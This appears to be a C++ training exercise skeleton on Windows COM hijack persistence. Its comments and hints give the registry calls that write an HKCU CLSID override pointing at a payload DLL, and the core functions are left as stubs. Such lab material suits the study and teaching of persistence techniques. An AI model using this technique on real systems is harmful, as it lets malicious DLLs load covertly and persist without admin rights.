/*
  Exercise 01 — COM Hijack Persistence
  =====================================
  COM (Component Object Model) activation first checks HKCU before HKCR.
  An attacker can register a CLSID override under HKCU without admin rights;
  any process that CoCreateInstance's that CLSID will load the attacker's DLL.

  Demo CLSID: {7C857801-7381-11CF-884D-00AA004B2E24}  (ShellLink — safe target)

  YOUR TASKS
  ----------
  1. Implement readOriginalCLSID()  — read the system-registered InprocServer32 from HKCR
  2. Implement writeHijackKey()     — write the override into HKCU
  3. Implement verifyHijack()       — compare HKCR vs HKCU values, flag the delta

  Compile:
    g++ -std=c++17 -Wall -o ex01.exe exercise_01_com_hijack.cpp -ladvapi32

  Cleanup when done:
    reg delete "HKCU\SOFTWARE\Classes\CLSID\{7C857801-7381-11CF-884D-00AA004B2E24}" /f
*/

#include <windows.h>
#include <iostream>
#include <string>

// ── constants ─────────────────────────────────────────────────────────────────
static const char* TARGET_CLSID = "{7C857801-7381-11CF-884D-00AA004B2E24}";
static const char* PAYLOAD_DLL  = "C:\\Temp\\payload.dll";

// ── provided helper ───────────────────────────────────────────────────────────
// Opens a REG_SZ value and returns it, or "" on any error.
std::string readRegSZ(HKEY root, const char* subkey, const char* valueName) {
    HKEY  hk   = nullptr;
    LONG  rc   = RegOpenKeyExA(root, subkey, 0, KEY_READ, &hk);
    if (rc != ERROR_SUCCESS) return "";

    char  buf[512] = {};
    DWORD type     = REG_SZ;
    DWORD size     = sizeof(buf);
    rc = RegQueryValueExA(hk, valueName, nullptr, &type,
                          reinterpret_cast<LPBYTE>(buf), &size);
    RegCloseKey(hk);
    return (rc == ERROR_SUCCESS) ? std::string(buf) : "";
}

// ─────────────────────────────────────────────────────────────────────────────
// TODO 1 — readOriginalCLSID
//   Reads HKCR\CLSID\{clsid}\InprocServer32 default value ("").
//   Returns the path string, or "" if the key does not exist.
//
//   Hint: build subkey = "CLSID\\" + clsid + "\\InprocServer32"
//         then call readRegSZ(HKEY_CLASSES_ROOT, subkey.c_str(), "")
// ─────────────────────────────────────────────────────────────────────────────
std::string readOriginalCLSID(const std::string& clsid) {
    // TODO: implement
    (void)clsid;
    return "";
}

// ─────────────────────────────────────────────────────────────────────────────
// TODO 2 — writeHijackKey
//   Creates HKCU\SOFTWARE\Classes\CLSID\{clsid}\InprocServer32
//   and sets its default value ("") to payloadPath.
//
//   Hint: build subkey = "SOFTWARE\\Classes\\CLSID\\" + clsid + "\\InprocServer32"
//         call RegCreateKeyExA(HKEY_CURRENT_USER, subkey.c_str(), 0, nullptr,
//                              REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
//                              nullptr, &hk, nullptr)
//         call RegSetValueExA(hk, "", 0, REG_SZ,
//                             (const BYTE*)payloadPath.c_str(),
//                             (DWORD)(payloadPath.size() + 1))
//   Returns true on success.
// ─────────────────────────────────────────────────────────────────────────────
bool writeHijackKey(const std::string& clsid, const std::string& payloadPath) {
    // TODO: implement
    (void)clsid; (void)payloadPath;
    return false;
}

// ─────────────────────────────────────────────────────────────────────────────
// TODO 3 — verifyHijack
//   Reads the HKCR value and the HKCU value for the given CLSID.
//   Prints:
//     HKCR original : <path>
//     HKCU override : <path>
//   If HKCU override is non-empty and differs from HKCR, print:
//     [+] Hijack active — HKCU wins at activation time
//   Otherwise print:
//     [-] No HKCU override detected
// ─────────────────────────────────────────────────────────────────────────────
void verifyHijack(const std::string& clsid) {
    // TODO: read original with readOriginalCLSID(clsid)
    // TODO: build hkcu_sub = "SOFTWARE\\Classes\\CLSID\\" + clsid + "\\InprocServer32"
    //       override = readRegSZ(HKEY_CURRENT_USER, hkcu_sub.c_str(), "")
    // TODO: print both, compare, flag
    (void)clsid;
    std::cout << "    (not implemented yet)\n";
}

// ─────────────────────────────────────────────────────────────────────────────
int main() {
    std::cout << "=== Exercise 01: COM Hijack Persistence ===\n\n";
    std::cout << "Target CLSID : " << TARGET_CLSID << "\n";
    std::cout << "Payload DLL  : " << PAYLOAD_DLL  << "\n\n";

    // Step 1 — read what HKCR currently says
    std::cout << "[1] Reading original InprocServer32 from HKCR ...\n";
    std::string original = readOriginalCLSID(TARGET_CLSID);
    if (original.empty())
        std::cout << "    (not found — CLSID may not be registered on this machine)\n\n";
    else
        std::cout << "    " << original << "\n\n";

    // Step 2 — write the HKCU override
    std::cout << "[2] Writing HKCU override ...\n";
    if (writeHijackKey(TARGET_CLSID, PAYLOAD_DLL))
        std::cout << "    Key written successfully.\n\n";
    else
        std::cout << "    Failed (complete TODO 2).\n\n";

    // Step 3 — verify
    std::cout << "[3] Verification:\n";
    verifyHijack(TARGET_CLSID);

    std::cout << "\n[i] Cleanup command:\n"
              << "    reg delete \"HKCU\\SOFTWARE\\Classes\\CLSID\\"
              << TARGET_CLSID << "\" /f\n";
    return 0;
}
